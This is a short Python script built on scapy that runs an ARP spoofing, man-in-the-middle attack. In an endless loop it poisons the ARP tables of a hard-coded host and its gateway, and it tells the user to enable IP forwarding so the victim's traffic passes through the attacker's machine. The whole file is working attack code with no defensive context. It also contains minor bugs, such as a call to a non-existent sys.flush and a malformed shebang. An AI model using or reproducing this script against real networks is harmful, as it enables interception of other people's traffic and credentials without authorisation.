#! usr/bin/env python
import scapy.all as scapy
import optparse
import time
import sys

print("Please run bellow command to flow packet from your system: echo 1 > /proc/sys/net/ipv4/ip_forward")


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    print(answered.show())
    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# scan("192.168.40.130")
counter = 0
try:
    while True:
        spoof("192.168.40.130", "192.168.40.2")
        spoof("192.168.40.2", "192.168.40.130")
        counter += 2
        print("\r[+]Send Packet: " + str(counter)),
        sys.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("Rummmmmmy")
